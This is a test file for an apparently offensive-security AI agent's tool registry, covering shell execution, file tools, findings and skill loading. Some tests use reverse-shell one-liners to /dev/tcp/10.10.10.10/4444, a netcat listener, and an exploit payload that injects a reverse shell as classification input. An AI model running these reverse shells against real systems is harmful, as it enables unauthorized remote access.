import { mkdir, mkdtemp, readFile, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join, posix } from "node:path";
import { expect, test } from "bun:test";
import { getTool, processOutput } from "../src/agent-tools/registry";
import { HostProcessBackend } from "../src/agent-tools/backends/host-process";
import type { BackendExecResult, BackendSessionResult, SessionKind } from "../src/agent-tools/backends/types";
import type { ToolExecutionBackend } from "../src/agent-tools/shared/backend";
import { sanitizeToolOutput } from "../src/agent-tools/shared/output-sanitize";
import { proxiedShellCommand, shouldAutoBackgroundShellCommand } from "../src/agent-tools/shell/exec";
import { execCommandTool } from "../src/agent-tools/shell/exec-command";
import type { ToolDefinition } from "../src/types";
import type { Evidence, Finding, MemoryItem, Note, OutputArtifact, Session, TodoItem, TodoStatus, ToolContext } from "../src/types";

let sessionSeq = 0;

class WorkspaceTestBackend implements ToolExecutionBackend {
  readonly kind = "workspace-test";
  private readonly host: HostProcessBackend;
  private readonly containerRoot: string;

  constructor(private readonly workspace: string) {
    this.host = new HostProcessBackend(workspace);
    this.containerRoot = join(workspace, ".container-root");
  }

  async exec(command: string, timeoutMs = 10_000, signal?: AbortSignal, maxOutputChars = 8_000): Promise<BackendExecResult> {
    const result = await this.host.runOnce(this.map(command), { timeoutMs, ...(signal ? { signal } : {}) });
    return {
      ...result,
      stdout: result.stdout.slice(0, maxOutputChars),
      stderr: result.stderr.slice(0, maxOutputChars)
    };
  }

  runOnce(command: string, options: { timeoutMs: number; signal?: AbortSignal }): Promise<BackendExecResult> {
    return this.exec(command, options.timeoutMs, options.signal);
  }

  startSession(command: string, options: { yieldMs: number; signal?: AbortSignal; kind?: SessionKind; pty?: boolean }): Promise<BackendSessionResult> {
    return this.host.startSession(this.map(command), options);
  }

  pollSession(sessionId: string, options: { input?: string; yieldMs: number }): Promise<BackendSessionResult> {
    return this.host.pollSession(sessionId, options);
  }

  waitSession(sessionId: string): Promise<BackendSessionResult> {
    return this.host.waitSession(sessionId);
  }

  stopSession(sessionId: string): Promise<void> {
    return this.host.stopSession(sessionId);
  }

  private map(command: string): string {
    return command.replace(/(['"])(\/[^'"]*)\1/g, (_match, quote: string, path: string) => `${quote}${this.mapPath(path)}${quote}`);
  }

  private mapPath(path: string): string {
    const normalized = posix.normalize(path);
    if (normalized === "/workspace") return this.workspace;
    if (normalized.startsWith("/workspace/")) return join(this.workspace, normalized.slice("/workspace/".length));
    return `${this.containerRoot}${normalized}`;
  }
}

function session(): Session {
  return {
    id: `ses_test_${++sessionSeq}`,
    workspace: "/tmp/farai-test",
    mode: "freestyle",
    phase: "understand_goal",
    createdAt: new Date(0).toISOString(),
    updatedAt: new Date(0).toISOString()
  };
}

function context(workspace: string): ToolContext & {
  savedEvidence: Evidence[];
  savedNotes: Note[];
  savedFindings: Finding[];
  savedMemory: MemoryItem[];
  savedTodos: TodoItem[];
  savedPlan: Array<{ step: string; status: "pending" | "in_progress" | "completed" }>;
  savedArtifacts: OutputArtifact[];
} {
  const savedEvidence: Evidence[] = [];
  const savedNotes: Note[] = [];
  const savedFindings: Finding[] = [];
  const savedMemory: MemoryItem[] = [];
  const savedTodos: TodoItem[] = [];
  let savedPlan: Array<{ step: string; status: "pending" | "in_progress" | "completed" }> = [];
  const savedArtifacts: OutputArtifact[] = [];
  return {
    session: session(),
    workspace,
    executionBackend: new WorkspaceTestBackend(workspace),
    now: () => new Date(0).toISOString(),
    savedEvidence,
    savedNotes,
    savedFindings,
    savedMemory,
    savedTodos,
    get savedPlan() { return savedPlan; },
    savedArtifacts,
    store: {
      saveEvidence: (evidence) => {
        savedEvidence.push(evidence);
        return evidence;
      },
      saveOutputArtifact: (input) => {
        const artifact: OutputArtifact = {
          id: `art_${savedArtifacts.length + 1}`,
          sessionId: input.sessionId,
          ...(input.toolCallId ? { toolCallId: input.toolCallId } : {}),
          path: `/tmp/art_${savedArtifacts.length + 1}.txt`,
          bytes: input.content.length,
          createdAt: new Date(0).toISOString()
        };
        savedArtifacts.push(artifact);
        return artifact;
      },
      addNote: (note) => {
        savedNotes.push(note);
      },
      saveFinding: (finding) => {
        savedFindings.push(finding);
      },
      upsertMemory: (item) => {
        const memory: MemoryItem = {
          id: `mem_${savedMemory.length + 1}`,
          ...item,
          createdAt: new Date(0).toISOString(),
          updatedAt: new Date(0).toISOString()
        };
        savedMemory.push(memory);
        return memory;
      },
      replacePlan: (_sessionId, plan) => {
        savedPlan = structuredClone(plan);
        return structuredClone(savedPlan);
      },
      createTodo: (item) => {
        const todo: TodoItem = {
          id: `todo_${savedTodos.length + 1}`,
          ...item,
          createdAt: new Date(0).toISOString(),
          updatedAt: new Date(0).toISOString()
        };
        savedTodos.push(todo);
        return todo;
      },
      updateTodo: (todoId, patch) => {
        const index = savedTodos.findIndex((todo) => todo.id === todoId);
        if (index === -1) throw new Error(`Todo not found: ${todoId}`);
        const current = savedTodos[index]!;
        const next: TodoItem = { ...current, ...patch, updatedAt: new Date(1).toISOString() };
        savedTodos[index] = next;
        return next;
      },
      listTodos: (_sessionId, options = {}) => {
        let todos = savedTodos;
        if (options.status) todos = todos.filter((todo) => todo.status === options.status);
        if (options.turnId) todos = todos.filter((todo) => todo.turnId === options.turnId);
        return todos.slice(0, options.limit ?? 50);
      }
    }
  };
}

test("code_write_script writes only inside helpers directory", async () => {
  const dir = await mkdtemp(join(tmpdir(), "farai-tools-"));
  const tool = mustGetTool("code_write_script");

  const ok = await tool.run({ filename: "probe.sh", content: "id\n" }, context(dir));
  expect(ok.ok).toBe(true);
  await expect(readFile(join(dir, "helpers", "probe.sh"), "utf8")).resolves.toBe("id\n");

  await expect(tool.run({ filename: "../escape.sh", content: "bad\n" }, context(dir))).rejects.toThrow("path escapes workspace");
});

test("manual evidence, notes, findings, and memory tools persist through ToolContext contract", async () => {
  const dir = await mkdtemp(join(tmpdir(), "farai-tools-"));
  const ctx = context(dir);

  await mustGetTool("evidence_save").run({ title: "HTTP banner", content: "Apache/2.4" }, ctx);
  await mustGetTool("notes_add").run({ text: "Port 80 is open", tags: ["recon"] }, ctx);
  await mustGetTool("report_add_finding").run({ title: "Default page exposed", cvssVector: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N", target: "10.10.10.10" }, ctx);
  await mustGetTool("memory_add_hypothesis").run({ key: "web-stack", text: "Likely Apache", confidence: "medium" }, ctx);
  await mustGetTool("memory_mark_failed").run({ key: "admin-login", reason: "404", command: "curl /admin" }, ctx);

  expect(ctx.savedEvidence).toHaveLength(1);
  expect(ctx.savedNotes).toHaveLength(1);
  expect(ctx.savedFindings).toHaveLength(1);
  expect(ctx.savedFindings[0]?.severity).toBe("medium");
  expect(ctx.savedFindings[0]?.cvssScore).toBe(5.3);
  expect(ctx.savedMemory.map((item) => item.kind)).toEqual(["hypothesis", "failed_attempt"]);
});

test("findings reject unscored manual severity", async () => {
  const ctx = context(await mkdtemp(join(tmpdir(), "farai-tools-")));
  await expect(mustGetTool("report_add_finding").run({ title: "Unscored finding", severity: "high" }, ctx)).rejects.toThrow("cvssVector");
});

test("process output includes stderr when command stdout is empty", () => {
  expect(processOutput("", "permission denied\n")).toBe("STDERR:\npermission denied\n");
  expect(processOutput("ok\n", "")).toBe("ok\n");
  expect(processOutput("ok\n", "warning\n")).toBe("ok\n\nSTDERR:\nwarning\n");
});

test("tool output sanitization preserves a readable preview of binary/control-heavy output", () => {
  const zipLike = "PK\u0003\u0004\u0000\u0000\u0000\u0000\uFFFD\uFFFD\uFFFD";
  expect(sanitizeToolOutput(zipLike)).toContain("binary-like output");
  const httpWithZip = "HTTP/1.1 200 OK\nContent-Type: application/zip\n\nPK\u0003\u0004\u0000\uFFFD\uFFFD\uFFFD";
  const sanitized = sanitizeToolOutput(httpWithZip);
  expect(sanitized).toContain("HTTP/1.1 200 OK");
  expect(sanitized).toContain("binary body");
  expect(sanitized).not.toContain("PK\u0003\u0004");
});

test("tool output sanitization preserves readable terminal output", () => {
  const colored = "\u001b[32mhttps://example.test\u001b[0m [200 OK]\n".repeat(20);
  expect(sanitizeToolOutput(colored)).toBe("https://example.test [200 OK]\n".repeat(20));

  const terminalNoise = "\u001b(B\u001b[mTLSv1.3 enabled\n".repeat(12);
  expect(sanitizeToolOutput(terminalNoise)).toBe("TLSv1.3 enabled\n".repeat(12));

  const lossyButReadable = `banner: ${"�".repeat(3)} still readable\nheaders: ok\n`;
  expect(sanitizeToolOutput(lossyButReadable)).toBe(lossyButReadable);
});

test("command_run auto-backgrounds obvious long-running interactive commands", () => {
  expect(shouldAutoBackgroundShellCommand("bash -i >& /dev/tcp/10.10.10.10/4444 0>&1")).toBe(true);
  expect(shouldAutoBackgroundShellCommand("nc -lvnp 4444")).toBe(true);
  expect(shouldAutoBackgroundShellCommand("tail -f /tmp/app.log")).toBe(true);
  expect(shouldAutoBackgroundShellCommand("echo quick && id")).toBe(false);
});

test("command_run proxy routing scopes proxy environment to one shell invocation", () => {
  expect(proxiedShellCommand("curl https://example.com; wget https://example.org", "http://127.0.0.1:31337")).toBe(
    "export http_proxy='http://127.0.0.1:31337' https_proxy='http://127.0.0.1:31337'; unset HTTP_PROXY HTTPS_PROXY ALL_PROXY all_proxy; curl https://example.com; wget https://example.org"
  );
});

test("command_run does not misclassify a heredoc payload's literal text as an interactive command", () => {
  const writeExploitScript = [
    "cat << 'EXPLOIT' > /tmp/lpd_exploit.py",
    "payload = f\"' ; bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1' #\"",
    "EXPLOIT",
    "python3 /tmp/lpd_exploit.py"
  ].join("\n");
  expect(shouldAutoBackgroundShellCommand(writeExploitScript)).toBe(false);

  const writeThenLaunchShell = ["cat << 'EOF' > /tmp/note.txt", "just some notes", "EOF", "bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"].join(
    "\n"
  );
  expect(shouldAutoBackgroundShellCommand(writeThenLaunchShell)).toBe(true);
});

test("command_run honors workdir and bounds returned output", async () => {
  const dir = await mkdtemp(join(tmpdir(), "farai-tools-"));
  await mkdir(join(dir, "nested"));
  const execCommand = mustGetTool("command_run");
  const writeStdin = mustGetTool("command_input");
  const awaitCompletion = async (result: Awaited<ReturnType<ToolDefinition["run"]>>, maxOutputTokens?: number) => {
    if (result.status !== "running_background" || !result.processId) return result;
    return await writeStdin.run({
      session_id: result.processId,
      yield_time_ms: 20_000,
      ...(maxOutputTokens ? { max_output_tokens: maxOutputTokens } : {})
    }, context(dir));
  };
  const workdirResult = await awaitCompletion(await execCommand.run({
    cmd: "test \"${PWD##*/}\" = nested && printf 'workdir-ok'",
    workdir: "nested",
    yield_time_ms: 20_000
  }, context(dir)));
  const boundedResult = await awaitCompletion(await execCommand.run({
    cmd: "printf '%0100d' 0",
    yield_time_ms: 1_000,
    max_output_tokens: 8
  }, context(dir)), 8);

  expect(workdirResult.ok).toBe(true);
  expect(workdirResult.output).toContain("workdir-ok");
  expect(boundedResult.ok).toBe(true);
  expect(boundedResult.output).toContain("bytes omitted");
});

test("command_run and command_input share one interactive process", async () => {
  const dir = await mkdtemp(join(tmpdir(), "farai-tools-"));
  const ctx = context(dir);
  const started = await mustGetTool("command_run").run({
    cmd: "read value; printf 'received:%s\\n' \"$value\"",
    tty: true,
    yield_time_ms: 250
  }, ctx);
  expect(started.status).toBe("running_background");
  expect(started.processId).toBeTruthy();

  const finished = await mustGetTool("command_input").run({
    session_id: started.processId,
    chars: "hello\\n",
    yield_time_ms: 1_000,
    max_output_tokens: 100
  }, ctx);
  expect(finished.status).toBe("done");
  expect(finished.output).toContain("received:hello");
});

test("todo tools create, update, and list durable task state through ToolContext contract", async () => {
  const dir = await mkdtemp(join(tmpdir(), "farai-tools-"));
  const ctx = context(dir);

  const added = await mustGetTool("todo_add").run({ text: "Run scoped recon", priority: "high" }, ctx);
  const todo = JSON.parse(String(added.output)) as TodoItem;
  expect(todo.status).toBe("pending");
  expect(todo.priority).toBe("high");

  await mustGetTool("todo_update").run({ id: todo.id, status: "in_progress" satisfies TodoStatus }, ctx);
  const listed = await mustGetTool("todo_list").run({ status: "in_progress" }, ctx);
  expect(listed.summary).toBe("1 todo(s)");
  expect(JSON.parse(String(listed.output))[0]).toMatchObject({ id: todo.id, status: "in_progress" });
});

test("update_plan atomically replaces the ordered plan and validates progress", async () => {
  const ctx = context(await mkdtemp(join(tmpdir(), "farai-tools-")));
  const updated = await mustGetTool("update_plan").run({ plan: [
    { step: "Inspect", status: "completed" },
    { step: "Implement", status: "in_progress" },
    { step: "Verify", status: "pending" }
  ] }, ctx);
  expect(updated.ok).toBe(true);
  expect(ctx.savedPlan).toEqual([
    { step: "Inspect", status: "completed" },
    { step: "Implement", status: "in_progress" },
    { step: "Verify", status: "pending" }
  ]);
  await expect(mustGetTool("update_plan").run({ plan: [
    { step: "One", status: "in_progress" },
    { step: "Two", status: "in_progress" }
  ] }, ctx)).rejects.toThrow("only one in_progress");
});

test("filesystem tools read, list, grep, write, edit, patch, and protect internal paths", async () => {
  const dir = await mkdtemp(join(tmpdir(), "farai-tools-"));
  const ctx = context(dir);
  const diagnosed: string[] = [];
  ctx.lsp = {
    diagnose: async ({ path }) => {
      diagnosed.push(path);
      throw new Error("fake LSP failure");
    },
    inspect: async () => { throw new Error("not used"); }
  };

  await mustGetTool("file_write").run({ path: "notes/service.txt", content: "port 80 open\napache\n" }, ctx);
  await expect(readFile(join(dir, "notes", "service.txt"), "utf8")).resolves.toContain("apache");

  const read = await mustGetTool("file_read").run({ path: "notes/service.txt", offset: 1, limit: 1 }, ctx);
  expect(read.output).toBe("port 80 open");

  const listed = await mustGetTool("file_list").run({ path: ".", limit: 10 }, ctx);
  expect(listed.output).toContain("notes/service.txt");

  const grep = await mustGetTool("file_search").run({ pattern: "apache", path: ".", limit: 10 }, ctx);
  expect(grep.output).toContain("notes/service.txt:2");

  const edit = await mustGetTool("fs_edit").run({ path: "notes/service.txt", oldString: "apache", newString: "nginx" }, ctx);
  expect(edit.summary).toContain("replacements=1");
  await expect(readFile(join(dir, "notes", "service.txt"), "utf8")).resolves.toContain("nginx");

  const patch = ["*** Begin Patch", "*** Add File: notes/new.txt", "+hello", "*** Update File: notes/service.txt", "-nginx", "+caddy", "*** End Patch"].join("\n");
  const patched = await mustGetTool("patch_apply").run({ patch }, ctx);
  expect(patched.output).toContain("A notes/new.txt");
  expect(patched.output).toContain("M notes/service.txt");
  await expect(readFile(join(dir, "notes", "service.txt"), "utf8")).resolves.toContain("caddy");
  expect(diagnosed.sort()).toEqual(["notes/service.txt", "notes/service.txt", "notes/new.txt", "notes/service.txt"].sort());

  await expect(mustGetTool("file_read").run({ path: ".farai/farai.db" }, ctx)).rejects.toThrow("path is protected");

  await mustGetTool("file_write").run({ path: "../escape.txt", content: "bad" }, ctx);
  const escaped = await mustGetTool("file_read").run({ path: "/escape.txt" }, ctx);
  expect(escaped.output).toBe("bad");
});

test("fs.* runs inside the Kali container: /workspace paths and arbitrary container paths (e.g. /tmp) both work, unlike the old host-jailed behavior", async () => {
  const dir = await mkdtemp(join(tmpdir(), "farai-tools-"));
  const ctx = context(dir);
  await mustGetTool("file_write").run({ path: "server.py", content: "print(1)\n" }, ctx);

  const viaContainerPath = await mustGetTool("file_read").run({ path: "/workspace/server.py" }, ctx);
  expect(viaContainerPath.output).toBe("print(1)\n");

  await mustGetTool("file_write").run({ path: "/tmp/only-in-container.py", content: "print(2)\n" }, ctx);
  const viaTmp = await mustGetTool("file_read").run({ path: "/tmp/only-in-container.py" }, ctx);
  expect(viaTmp.output).toBe("print(2)\n");

  await expect(mustGetTool("file_read").run({ path: "/tmp/does-not-exist.py" }, ctx)).rejects.toThrow(/no such file or directory/);
});

test("git tools expose status and diff", async () => {
  const dir = await mkdtemp(join(tmpdir(), "farai-git-"));
  const ctx = context(dir);
  Bun.spawnSync(["git", "init"], { cwd: dir, stdout: "ignore", stderr: "ignore" });
  await mustGetTool("file_write").run({ path: "README.md", content: "# test\n" }, ctx);
  Bun.spawnSync(["git", "add", "README.md"], { cwd: dir, stdout: "ignore", stderr: "ignore" });
  Bun.spawnSync(["git", "-c", "user.name=Farai Test", "-c", "user.email=test@example.invalid", "commit", "-m", "initial"], { cwd: dir, stdout: "ignore", stderr: "ignore" });
  await mustGetTool("fs_edit").run({ path: "README.md", oldString: "# test", newString: "# test\n\nupdated" }, ctx);
  const status = await mustGetTool("git_status").run({}, ctx);
  expect(status.output).toContain("README.md");
  const diff = await mustGetTool("git_diff").run({}, ctx);
  expect(diff.output).toContain("updated");
});

test("skill_load returns matching playbooks and reports unknown names without throwing", async () => {
  const workspace = await mkdtemp(join(tmpdir(), "farai-skill-load-"));
  const skillDir = join(workspace, ".agents", "skills", "reverse-shells");
  await mkdir(skillDir, { recursive: true });
  await writeFile(
    join(skillDir, "SKILL.md"),
    [
      "---",
      "name: reverse-shells",
      "description: reverse shell payloads and callback listener setup.",
      "---",
      "",
      "# reverse shells",
      "",
      "always call callback_host_info first to get the host-reachable lhost.",
      ""
    ].join("\n")
  );
  const ctx = context(workspace);
  const known = await mustGetTool("knowledge_manage").run({ operation: "skill_load", args: { name: "reverse-shells" } }, ctx);
  expect(known.ok).toBe(true);
  expect(known.output).toContain("# loaded skill: reverse-shells");
  expect(known.output).toContain("callback_host_info");

  const none = await mustGetTool("knowledge_manage").run({ operation: "skill_load", args: { name: "totally-unknown" } }, ctx);
  expect(none.ok).toBe(false);
});

function mustGetTool(name: string): ToolDefinition {
  const direct: Record<string, string> = {
    code_write_script: "script_write",
    command_run: "command_run",
    command_input: "command_input",
    file_write: "file_write",
    file_read: "file_read",
    file_list: "file_list",
    file_search: "file_search",
    fs_edit: "file_replace",
    patch_apply: "file_patch"
  };
  const facade: Record<string, { tool: string; operation: string }> = {
    evidence_save: { tool: "knowledge_manage", operation: "save" },
    notes_add: { tool: "knowledge_manage", operation: "add" },
    memory_add_hypothesis: { tool: "knowledge_manage", operation: "add_hypothesis" },
    memory_mark_failed: { tool: "knowledge_manage", operation: "mark_failed" },
    report_add_finding: { tool: "finding_manage", operation: "add_finding" },
    todo_add: { tool: "task_manage", operation: "add" },
    todo_update: { tool: "task_manage", operation: "update" },
    todo_list: { tool: "task_manage", operation: "list" },
    update_plan: { tool: "task_manage", operation: "plan" }
  };
  const facadeCall = facade[name];
  if (name === "command_run") return execCommandTool;
  const tool = getTool(facadeCall?.tool ?? direct[name] ?? name);
  if (!tool) throw new Error(`missing tool: ${name}`);
  if (facadeCall) {
    return {
      ...tool,
      run: (args, context) => tool.run({ operation: facadeCall.operation, args }, context)
    };
  }
  return tool;
}
